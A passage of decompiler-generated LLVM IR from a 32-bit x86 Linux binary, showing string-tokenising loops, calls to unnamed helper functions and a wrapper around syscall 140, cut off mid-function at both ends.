  %v1_805707d.pre-phi = phi i32* [ %.pre, %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge ], [ %v1_8056f4a, %dec_label_pc_8056fab ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge ], [ %v4_8056fbb, %dec_label_pc_8056fab ]
  %stack_var_-20.0.in = phi i32 [ %v1_8056f33, %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge ], [ %v0_8056fb7, %dec_label_pc_8056fab ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge ], [ %v1_8056f33, %dec_label_pc_8056fab ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge ], [ %v0_8056fb3, %dec_label_pc_8056fab ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge ], [ %v0_8056f9e, %dec_label_pc_8056fab ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge ], [ %v1_8056f77, %dec_label_pc_8056fab ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_805707d.pre-phi, align 4
  %v12_8057107 = icmp eq i32 %arg4, 2
  %v4_8057132 = inttoptr i32 %arg2 to i8*
  %v12_8057145 = icmp eq i32 %arg3, 2
  %v12_8057167 = icmp eq i32 %arg3, 10
  %v1_8057111 = icmp eq i1 %v12_8057107, false
  %v1_805714a = icmp eq i1 %v12_8057145, false
  %v1_805716c = icmp eq i1 %v12_8057167, false
  br label %dec_label_pc_805718f.outer

dec_label_pc_805718f.outer:                       ; preds = %dec_label_pc_8057167, %dec_label_pc_805716e, %dec_label_pc_805714c, %dec_label_pc_8057079
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8057079 ], [ 2, %dec_label_pc_805714c ], [ 2, %dec_label_pc_805716e ], [ 2, %dec_label_pc_8057167 ]
  br label %dec_label_pc_805718f

dec_label_pc_8057090:                             ; preds = %dec_label_pc_805718f
  %v3_8057098 = call i32 @function_8051ebc(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8057098, i32* @eax, align 4
  %v1_80570a0 = icmp eq i32 %v3_8057098, 0
  br i1 %v1_80570a0, label %dec_label_pc_80570a7, label %dec_label_pc_80570a4

dec_label_pc_80570a4:                             ; preds = %dec_label_pc_8057090
  %v1_80570a4 = inttoptr i32 %v3_8057098 to i8*
  store i8 0, i8* %v1_80570a4, align 1
  br label %dec_label_pc_80570a7

dec_label_pc_80570a7:                             ; preds = %dec_label_pc_8057090, %dec_label_pc_80570a4
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80570e734 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80570e735 = icmp eq i8 %v2_80570e734, 0
  %v1_80570ea41 = icmp eq i1 %v3_80570e735, false
  br i1 %v1_80570ea41, label %dec_label_pc_80570b3.preheader.preheader, label %dec_label_pc_80570ec

dec_label_pc_80570b3.preheader.preheader:         ; preds = %dec_label_pc_80570a7
  %v4_80570b398.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80570b3.preheader

dec_label_pc_80570af:                             ; preds = %dec_label_pc_80570b9
  store i8 0, i8* %v1_80570b3104, align 1
  %v0_80570b2 = load i32, i32* @ecx, align 4
  %v1_80570b2 = add i32 %v0_80570b2, 1
  store i32 %v1_80570b2, i32* @ecx, align 4
  %v1_80570b3 = inttoptr i32 %v1_80570b2 to i8*
  %v2_80570b3 = load i8, i8* %v1_80570b3, align 1
  %v3_80570b3 = zext i8 %v2_80570b3 to i32
  %v4_80570b3 = load i32, i32* %eax.global-to-local, align 4
  %v5_80570b3 = and i32 %v4_80570b3, -256
  %v6_80570b3 = or i32 %v5_80570b3, %v3_80570b3
  store i32 %v6_80570b3, i32* @eax, align 4
  %v4_80570b5 = icmp eq i8 %v2_80570b3, 0
  br i1 %v4_80570b5, label %dec_label_pc_80570b3.dec_label_pc_80570ec.loopexit_crit_edge, label %dec_label_pc_80570b9

dec_label_pc_80570b9:                             ; preds = %dec_label_pc_80570b3.preheader, %dec_label_pc_80570af
  %v2_80570b3105 = phi i8 [ %v2_80570b3, %dec_label_pc_80570af ], [ %v2_80570b396, %dec_label_pc_80570b3.preheader ]
  %v1_80570b3104 = phi i8* [ %v1_80570b3, %dec_label_pc_80570af ], [ %v1_80570b395, %dec_label_pc_80570b3.preheader ]
  %v0_80570af103 = phi i32 [ %v1_80570b2, %dec_label_pc_80570af ], [ %v0_80570b349, %dec_label_pc_80570b3.preheader ]
  %v2_80570b9 = sext i8 %v2_80570b3105 to i32
  store i32 %v2_80570b9, i32* @edx, align 4
  %v0_80570bc = load i32, i32* @global_var_805e61c, align 4
  store i32 %v0_80570bc, i32* %eax.global-to-local, align 4
  %v2_80570c1 = mul nsw i32 %v2_80570b9, 2
  %v3_80570c1 = add i32 %v0_80570bc, %v2_80570c1
  %v4_80570c1 = inttoptr i32 %v3_80570c1 to i8*
  %v5_80570c1 = load i8, i8* %v4_80570c1, align 1
  %v6_80570c1 = and i8 %v5_80570c1, 32
  %v7_80570c1 = icmp eq i8 %v6_80570c1, 0
  %v1_80570c5 = icmp eq i1 %v7_80570c1, false
  br i1 %v1_80570c5, label %dec_label_pc_80570af, label %dec_label_pc_80570c7

dec_label_pc_80570c7:                             ; preds = %dec_label_pc_80570b9
  %v0_80570c7 = load i32, i32* @edi, align 4
  %v1_80570c7 = add i32 %v0_80570c7, -6
  %v6_80570c7 = sub i32 5, %v0_80570c7
  %v7_80570c7 = and i32 %v6_80570c7, %v0_80570c7
  %v8_80570c7 = icmp slt i32 %v7_80570c7, 0
  %v9_80570c7 = icmp eq i32 %v1_80570c7, 0
  %v10_80570c7 = icmp slt i32 %v1_80570c7, 0
  %v3_80570ca = icmp eq i1 %v10_80570c7, %v8_80570c7
  %v4_80570ca = icmp eq i1 %v9_80570c7, false
  %v5_80570ca = and i1 %v4_80570ca, %v3_80570ca
  br i1 %v5_80570ca, label %dec_label_pc_80570d3.preheader, label %dec_label_pc_80570cc

dec_label_pc_80570cc:                             ; preds = %dec_label_pc_80570c7
  %v1_80570cc = load i32, i32* @ebx, align 4
  %v3_80570cc = mul i32 %v0_80570c7, 4
  %v4_80570cc = add i32 %v1_80570cc, %v3_80570cc
  %v5_80570cc = inttoptr i32 %v4_80570cc to i32*
  store i32 %v0_80570af103, i32* %v5_80570cc, align 4
  %v0_80570cf = load i32, i32* @edi, align 4
  %v1_80570cf = add i32 %v0_80570cf, 1
  store i32 %v1_80570cf, i32* @edi, align 4
  %v0_80570d3.pre.pre = load i32, i32* @ecx, align 4
  %v4_80570d3.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570d3.preheader

dec_label_pc_80570d3.preheader:                   ; preds = %dec_label_pc_80570cc, %dec_label_pc_80570c7
  %v4_80570d3.pre = phi i32 [ %v4_80570d3.pre.pre, %dec_label_pc_80570cc ], [ %v0_80570bc, %dec_label_pc_80570c7 ]
  %v0_80570d3.pre = phi i32 [ %v0_80570d3.pre.pre, %dec_label_pc_80570cc ], [ %v0_80570af103, %dec_label_pc_80570c7 ]
  %v0_80570ec54 = phi i32 [ %v1_80570cf, %dec_label_pc_80570cc ], [ %v0_80570c7, %dec_label_pc_80570c7 ]
  %v1_80570d3106 = inttoptr i32 %v0_80570d3.pre to i8*
  %v2_80570d3107 = load i8, i8* %v1_80570d3106, align 1
  %v3_80570d3108 = zext i8 %v2_80570d3107 to i32
  %v5_80570d3109 = and i32 %v4_80570d3.pre, -256
  %v6_80570d3110 = or i32 %v3_80570d3108, %v5_80570d3109
  store i32 %v6_80570d3110, i32* @eax, align 4
  %v4_80570d5111 = icmp eq i8 %v2_80570d3107, 0
  br i1 %v4_80570d5111, label %dec_label_pc_80570e7.loopexit, label %dec_label_pc_80570d9.lr.ph

dec_label_pc_80570d9.lr.ph:                       ; preds = %dec_label_pc_80570d3.preheader
  %v0_80570dc.pre = load i32, i32* @global_var_805e61c, align 4
  br label %dec_label_pc_80570d9

dec_label_pc_80570d2:                             ; preds = %dec_label_pc_80570d9
  %v1_80570d2 = add i32 %v0_80570e7113, 1
  store i32 %v1_80570d2, i32* @ecx, align 4
  %v1_80570d3 = inttoptr i32 %v1_80570d2 to i8*
  %v2_80570d3 = load i8, i8* %v1_80570d3, align 1
  %v3_80570d3 = zext i8 %v2_80570d3 to i32
  %v5_80570d3 = and i32 %v0_80570dc.pre, -256
  %v6_80570d3 = or i32 %v3_80570d3, %v5_80570d3
  store i32 %v6_80570d3, i32* @eax, align 4
  %v4_80570d5 = icmp eq i8 %v2_80570d3, 0
  br i1 %v4_80570d5, label %dec_label_pc_80570e7.loopexit, label %dec_label_pc_80570d9

dec_label_pc_80570d9:                             ; preds = %dec_label_pc_80570d9.lr.ph, %dec_label_pc_80570d2
  %v2_80570d3115 = phi i8 [ %v2_80570d3107, %dec_label_pc_80570d9.lr.ph ], [ %v2_80570d3, %dec_label_pc_80570d2 ]
  %v1_80570d3114 = phi i8* [ %v1_80570d3106, %dec_label_pc_80570d9.lr.ph ], [ %v1_80570d3, %dec_label_pc_80570d2 ]
  %v0_80570e7113 = phi i32 [ %v0_80570d3.pre, %dec_label_pc_80570d9.lr.ph ], [ %v1_80570d2, %dec_label_pc_80570d2 ]
  %v2_80570d9 = sext i8 %v2_80570d3115 to i32
  store i32 %v2_80570d9, i32* @edx, align 4
  store i32 %v0_80570dc.pre, i32* @eax, align 4
  %v2_80570e1 = mul nsw i32 %v2_80570d9, 2
  %v3_80570e1 = add i32 %v0_80570dc.pre, %v2_80570e1
  %v4_80570e1 = inttoptr i32 %v3_80570e1 to i8*
  %v5_80570e1 = load i8, i8* %v4_80570e1, align 1
  %v6_80570e1 = and i8 %v5_80570e1, 32
  %v7_80570e1 = icmp eq i8 %v6_80570e1, 0
  br i1 %v7_80570e1, label %dec_label_pc_80570d2, label %dec_label_pc_80570e7.loopexit

dec_label_pc_80570e7.loopexit:                    ; preds = %dec_label_pc_80570d9, %dec_label_pc_80570d2, %dec_label_pc_80570d3.preheader
  %v4_80570b398138 = phi i32 [ %v6_80570d3110, %dec_label_pc_80570d3.preheader ], [ %v6_80570d3, %dec_label_pc_80570d2 ], [ %v0_80570dc.pre, %dec_label_pc_80570d9 ]
  %v0_80570e7.lcssa = phi i32 [ %v0_80570d3.pre, %dec_label_pc_80570d3.preheader ], [ %v1_80570d2, %dec_label_pc_80570d2 ], [ %v0_80570e7113, %dec_label_pc_80570d9 ]
  %v1_80570d3.lcssa = phi i8* [ %v1_80570d3106, %dec_label_pc_80570d3.preheader ], [ %v1_80570d3, %dec_label_pc_80570d2 ], [ %v1_80570d3114, %dec_label_pc_80570d9 ]
  %v2_80570e7 = load i8, i8* %v1_80570d3.lcssa, align 1
  %v3_80570e7 = icmp eq i8 %v2_80570e7, 0
  %v1_80570ea = icmp eq i1 %v3_80570e7, false
  br i1 %v1_80570ea, label %dec_label_pc_80570b3.preheader, label %dec_label_pc_80570ec

dec_label_pc_80570b3.preheader:                   ; preds = %dec_label_pc_80570b3.preheader.preheader, %dec_label_pc_80570e7.loopexit
  %v0_80570ec.pre141 = phi i32 [ %v0_80570ec54, %dec_label_pc_80570e7.loopexit ], [ 0, %dec_label_pc_80570b3.preheader.preheader ]
  %v4_80570b398 = phi i32 [ %v4_80570b398138, %dec_label_pc_80570e7.loopexit ], [ %v4_80570b398.pre, %dec_label_pc_80570b3.preheader.preheader ]
  %v0_80570b349 = phi i32 [ %v0_80570e7.lcssa, %dec_label_pc_80570e7.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_80570b3.preheader.preheader ]
  %v1_80570b395 = inttoptr i32 %v0_80570b349 to i8*
  %v2_80570b396 = load i8, i8* %v1_80570b395, align 1
  %v3_80570b397 = zext i8 %v2_80570b396 to i32
  %v5_80570b399 = and i32 %v4_80570b398, -256
  %v6_80570b3100 = or i32 %v5_80570b399, %v3_80570b397
  store i32 %v6_80570b3100, i32* @eax, align 4
  %v4_80570b5101 = icmp eq i8 %v2_80570b396, 0
  br i1 %v4_80570b5101, label %dec_label_pc_80570ec, label %dec_label_pc_80570b9

dec_label_pc_80570b3.dec_label_pc_80570ec.loopexit_crit_edge: ; preds = %dec_label_pc_80570af
  %v0_80570ec.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80570ec

dec_label_pc_80570ec:                             ; preds = %dec_label_pc_80570e7.loopexit, %dec_label_pc_80570b3.dec_label_pc_80570ec.loopexit_crit_edge, %dec_label_pc_80570b3.preheader, %dec_label_pc_80570a7
  %v1_80570ef = phi i32 [ 0, %dec_label_pc_80570a7 ], [ %v0_80570ec.pre.pre, %dec_label_pc_80570b3.dec_label_pc_80570ec.loopexit_crit_edge ], [ %v0_80570ec.pre141, %dec_label_pc_80570b3.preheader ], [ %v0_80570ec54, %dec_label_pc_80570e7.loopexit ]
  %v0_80570ef = load i32, i32* @ebx, align 4
  %v2_80570ef = mul i32 %v1_80570ef, 4
  %v3_80570ef = add i32 %v0_80570ef, %v2_80570ef
  %v4_80570ef = inttoptr i32 %v3_80570ef to i32*
  store i32 0, i32* %v4_80570ef, align 4
  %v7_80570f6 = icmp sgt i32 %v1_80570ef, 1
  br i1 %v7_80570f6, label %dec_label_pc_80570fc, label %dec_label_pc_805718f

dec_label_pc_80570fc:                             ; preds = %dec_label_pc_80570ec
  br i1 %v12_8056f2e, label %dec_label_pc_80571c9, label %dec_label_pc_8057107

dec_label_pc_8057107:                             ; preds = %dec_label_pc_80570fc
  store i32 1, i32* @esi, align 4
  br i1 %v1_8057111, label %dec_label_pc_805713f.preheader, label %dec_label_pc_8057113

dec_label_pc_805713f.preheader:                   ; preds = %dec_label_pc_8057107
  %v1_805713f119 = load i32, i32* @edi, align 4
  %v5_8057141127 = icmp sgt i32 %v1_805713f119, 1
  br i1 %v5_8057141127, label %dec_label_pc_8057129.lr.ph, label %dec_label_pc_805718f

dec_label_pc_8057129.lr.ph:                       ; preds = %dec_label_pc_805713f.preheader
  %v0_8057129.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057129

dec_label_pc_8057113:                             ; preds = %dec_label_pc_8057107
  %v0_8057113 = load i32, i32* @eax, align 4
  %v0_8057115 = load i32, i32* @ebx, align 4
  %v1_8057115 = inttoptr i32 %v0_8057115 to i32*
  %v2_8057115 = load i32, i32* %v1_8057115, align 4
  %v5_805711b = call i32 @function_80565b4(i8* %v4_8057132, i32 %v2_8057115, i32 %v0_8057113, i32 %v0_8057113)
  store i32 %v5_805711b, i32* %eax.global-to-local, align 4
  %v1_8057123 = icmp eq i32 %v5_805711b, 0
  %v1_8057125 = icmp eq i1 %v1_8057123, false
  br i1 %v1_8057125, label %dec_label_pc_805718f, label %dec_label_pc_8057145

dec_label_pc_8057129:                             ; preds = %dec_label_pc_8057129.lr.ph, %dec_label_pc_805713e
  %v0_8057129 = phi i32 [ %v0_8057129.pre, %dec_label_pc_8057129.lr.ph ], [ %v5_8057132, %dec_label_pc_805713e ]
  %v1_805712b128 = phi i32 [ 1, %dec_label_pc_8057129.lr.ph ], [ %v1_805713e, %dec_label_pc_805713e ]
  %v0_805712b = load i32, i32* @ebx, align 4
  %v2_805712b = mul i32 %v1_805712b128, 4
  %v3_805712b = add i32 %v0_805712b, %v2_805712b
  %v4_805712b = inttoptr i32 %v3_805712b to i32*
  %v5_805712b = load i32, i32* %v4_805712b, align 4
  %v5_8057132 = call i32 @function_805732c(i8* %v4_8057132, i32 %v5_805712b, i32 %v0_8057129, i32 %v0_8057129)
  store i32 %v5_8057132, i32* %eax.global-to-local, align 4
  %v1_805713a = icmp eq i32 %v5_8057132, 0
  br i1 %v1_805713a, label %dec_label_pc_8057145, label %dec_label_pc_805713e

dec_label_pc_805713e:                             ; preds = %dec_label_pc_8057129
  %v0_805713e = load i32, i32* @esi, align 4
  %v1_805713e = add i32 %v0_805713e, 1
  store i32 %v1_805713e, i32* @esi, align 4
  %v1_805713f = load i32, i32* @edi, align 4
  %v5_8057141 = icmp slt i32 %v1_805713e, %v1_805713f
  br i1 %v5_8057141, label %dec_label_pc_8057129, label %dec_label_pc_805718f

dec_label_pc_8057145:                             ; preds = %dec_label_pc_8057113, %dec_label_pc_8057129
  br i1 %v1_805714a, label %dec_label_pc_8057167, label %dec_label_pc_805714c

dec_label_pc_805714c:                             ; preds = %dec_label_pc_8057145
  %v0_805714c = load i32, i32* @esi, align 4
  %v3_805714d = load i8*, i8** %stack_var_-44, align 4
  %v4_805714d = ptrtoint i8* %v3_805714d to i32
  %v0_8057151 = load i32, i32* @ebx, align 4
  %v1_8057151 = inttoptr i32 %v0_8057151 to i32*
  %v2_8057151 = load i32, i32* %v1_8057151, align 4
  %v4_8057155 = inttoptr i32 %v2_8057151 to i8*
  %v5_8057155 = call i32 @function_805675a(i32 2, i8* %v4_8057155, i32 %v4_805714d, i32 %v0_805714c)
  store i32 %v5_8057155, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8057155, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8056fe5, label %dec_label_pc_805718f.outer

dec_label_pc_8057167:                             ; preds = %dec_label_pc_8057145
  br i1 %v1_805716c, label %dec_label_pc_805718f.outer, label %dec_label_pc_805716e

dec_label_pc_805716e:                             ; preds = %dec_label_pc_8057167
  %v0_805716e = load i32, i32* @ecx, align 4
  %v0_8057173 = load i32, i32* @ebx, align 4
  %v1_8057173 = inttoptr i32 %v0_8057173 to i32*
  %v2_8057173 = load i32, i32* %v1_8057173, align 4
  %v4_8057177 = inttoptr i32 %v2_8057173 to i8*
  %v5_8057177 = call i32 @function_805675a(i32 10, i8* %v4_8057177, i32 %stack_var_-36.0, i32 %v0_805716e)
  store i32 %v5_8057177, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8057177, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8057012, label %dec_label_pc_805718f.outer

dec_label_pc_805718f:                             ; preds = %dec_label_pc_805713f.preheader, %dec_label_pc_805713e, %dec_label_pc_80570ec, %dec_label_pc_8057113, %dec_label_pc_805718f.outer
  %v0_805718f = load i32, i32* @edx, align 4
  %v3_8057199 = call i32 @function_80562b0(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_805718f)
  store i32 %v3_8057199, i32* @eax, align 4
  %v1_80571a1 = icmp eq i32 %v3_8057199, 0
  %v1_80571a3 = icmp eq i1 %v1_80571a1, false
  br i1 %v1_80571a3, label %dec_label_pc_8057090, label %dec_label_pc_80571a9

dec_label_pc_80571a9:                             ; preds = %dec_label_pc_805718f, %dec_label_pc_805703e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805703e ], [ %stack_var_-28.0.ph, %dec_label_pc_805718f ]
  br i1 %v12_8056f2e, label %dec_label_pc_80571c9, label %dec_label_pc_80571b0

dec_label_pc_80571b0:                             ; preds = %dec_label_pc_80571a9
  %v1_80571b7 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80571b7 = call i32 @function_8055d68(i16* %v1_80571b7)
  store i32 %v2_80571b7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80571c9

dec_label_pc_80571c9:                             ; preds = %dec_label_pc_80570fc, %dec_label_pc_8056f19, %dec_label_pc_8056f25, %dec_label_pc_8056f43, %dec_label_pc_8056f56, %dec_label_pc_8056f62, %dec_label_pc_8056f6b, %dec_label_pc_8056f95, %dec_label_pc_80571a9, %dec_label_pc_80571b0, %dec_label_pc_8056fcb
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80571a9 ], [ %stack_var_-28.1, %dec_label_pc_80571b0 ], [ %v2_8056fda, %dec_label_pc_8056fcb ], [ 34, %dec_label_pc_8056f95 ], [ 34, %dec_label_pc_8056f6b ], [ 34, %dec_label_pc_8056f62 ], [ 34, %dec_label_pc_8056f56 ], [ 34, %dec_label_pc_8056f43 ], [ 34, %dec_label_pc_8056f25 ], [ 34, %dec_label_pc_8056f19 ], [ %stack_var_-28.0.ph, %dec_label_pc_80570fc ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8056f04, i32* @ebx, align 4
  store i32 %v0_8056f03, i32* @esi, align 4
  store i32 %v0_8056f02, i32* @edi, align 4
  store i32 %v0_8056f01, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_805713e, { 0, 2, 1 }
  uselistorder i32 %v5_8057132, { 1, 2, 0 }
  uselistorder i32 %v0_8057129, { 1, 0 }
  uselistorder i32 %v1_80570ef, { 1, 0 }
  uselistorder i8 %v2_80570b396, { 1, 2, 0 }
  uselistorder i8* %v1_80570b395, { 1, 0 }
  uselistorder i32 %v0_80570b349, { 1, 0 }
  uselistorder i32 %v2_80570d9, { 1, 0 }
  uselistorder i32 %v1_80570d2, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80570dc.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80570c7, { 1, 0 }
  uselistorder i32 %v0_80570c7, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80570b9, { 1, 0 }
  uselistorder i8* %v4_8057132, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8056f77, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8056f56, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8056f33, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8056f3a, { 1, 0 }
  uselistorder i32 %v1_8056f14, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 2, 13, 14, 12, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80562b0, { 1, 0 }
  uselistorder i32 5, { 8, 14, 15, 16, 0, 7, 4, 5, 10, 6, 17, 18, 2, 3, 11, 9, 12, 13, 1 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 14, 15, 4, 0, 3, 5, 6, 7, 1, 2 }
  uselistorder i32* @global_var_805e61c, { 0, 4, 2, 5, 1, 3, 6 }
  uselistorder i32 35, { 1, 2, 0 }
  uselistorder i32 10, { 15, 0, 23, 24, 25, 26, 27, 28, 1, 12, 16, 2, 8, 29, 9, 10, 11, 17, 3, 13, 21, 30, 18, 4, 7, 22, 5, 19, 20, 14, 6 }
  uselistorder i32 80, { 0, 2, 4, 5, 6, 7, 8, 9, 10, 11, 3, 1 }
  uselistorder i32 56, { 6, 7, 8, 9, 4, 10, 11, 1, 12, 13, 14, 15, 5, 3, 2, 16, 0 }
  uselistorder i32 44, { 6, 7, 8, 3, 1, 9, 4, 5, 10, 11, 2, 15, 17, 16, 12, 13, 14, 18, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 15, 4, 3, 16, 17, 18, 0, 8, 5, 1, 10, 6, 7, 11, 12, 13, 14, 2, 9 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 -32, { 2, 0, 1 }
  uselistorder i32 32, { 58, 0, 59, 60, 26, 28, 61, 62, 63, 64, 65, 27, 66, 67, 68, 39, 40, 46, 71, 29, 44, 5, 4, 6, 7, 41, 8, 9, 45, 10, 11, 12, 13, 14, 1, 47, 48, 2, 49, 50, 51, 52, 53, 54, 55, 15, 56, 42, 69, 70, 57, 17, 16, 31, 32, 43, 3, 33, 18, 19, 21, 20, 34, 36, 23, 22, 35, 37, 30, 25, 24, 38 }
  uselistorder i32* @ebp, { 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 6, 10, 11, 12, 13, 14, 15, 2, 109, 110, 111, 116, 112, 113, 114, 115, 117, 118, 0, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 33, 34, 157, 158, 159, 160, 161, 162, 163, 164, 35, 36, 37, 38, 39, 5, 179, 16, 17, 18, 23, 24, 180, 181, 182, 183, 184, 165, 166, 167, 168, 169, 170, 171, 172, 177, 173, 174, 175, 176, 1, 178, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 4, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 3, 61, 19, 20, 21, 7, 8, 9, 22, 25, 26, 27, 28, 29, 30, 31, 32, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 196, 197, 92, 93 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80571c9, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805718f, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8057145, { 1, 0 }
  uselistorder label %dec_label_pc_8057129, { 1, 0 }
  uselistorder label %dec_label_pc_80570ec, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80570b3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80570d9, { 1, 0 }
  uselistorder label %dec_label_pc_80570a7, { 1, 0 }
  uselistorder label %dec_label_pc_805718f.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057079, { 1, 0 }
  uselistorder label %dec_label_pc_805703e, { 1, 0 }
  uselistorder label %dec_label_pc_8056f95, { 1, 0 }
  uselistorder label %dec_label_pc_8056f25, { 1, 0 }
}

define i32 @function_80571d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80571d8:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80571da = load i32, i32* @ebx, align 4
  store i32 %v0_80571da, i32* %stack_var_-12, align 4
  %v2_80571e2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80571e2, i32* %esi.global-to-local, align 4
  %v1_80571fc = call i32 @int80_syscall(i32 140)
  store i32 %v1_80571fc, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_80571fc, -4095
  br i1 %tmp16, label %dec_label_pc_8057216, label %dec_label_pc_8057208

dec_label_pc_8057208:                             ; preds = %dec_label_pc_80571d8
  %v1_8057208 = call i32 @function_8050f90(i32 %arg3)
  %v0_805720d = load i32, i32* %esi.global-to-local, align 4
  %v1_805720d = sub i32 0, %v0_805720d
  %v2_805720f = inttoptr i32 %v1_8057208 to i32*
  store i32 %v1_805720d, i32* %v2_805720f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805721a

dec_label_pc_8057216:                             ; preds = %dec_label_pc_80571d8
  %v1_8057216 = icmp eq i32 %v1_80571fc, 0
  br i1 %v1_8057216, label %dec_label_pc_805721f, label %dec_label_pc_805721a

dec_label_pc_805721a:                             ; preds = %dec_label_pc_8057216, %dec_label_pc_8057208
  %v0_805721a = phi i32 [ %v1_80571fc, %dec_label_pc_8057216 ], [ -1, %dec_label_pc_8057208 ]
  %v1_805721c = ashr i32 %v0_805721a, 31
  br label %dec_label_pc_8057227

dec_label_pc_805721f:                             ; preds = %dec_label_pc_8057216
  %v3_805721f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8057227

dec_label_pc_8057227:                             ; preds = %dec_label_pc_805721a, %dec_label_pc_805721f
  %v0_805722d = phi i32 [ %v0_805721a, %dec_label_pc_805721a ], [ %v3_805721f, %dec_label_pc_805721f ]
  %storemerge = phi i32 [ %v1_805721c, %dec_label_pc_805721a ], [ %tmp, %dec_label_pc_805721f ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_805722a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805722a, i32* @ebx, align 4
  ret i32 %v0_805722d

; uselistorder directives
  uselistorder i32 %v1_80571fc, { 1, 2, 0, 3 }
  uselistorder i32 31, { 15, 10, 16, 21, 22, 17, 18, 8, 7, 14, 11, 12, 13, 3, 4, 1, 2, 9, 5, 6, 19, 20, 0 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057227, { 1, 0 }
}

define i32 @function_8057230(i32 %arg1) local_unnamed_addr {
dec_label_pc_8057230:
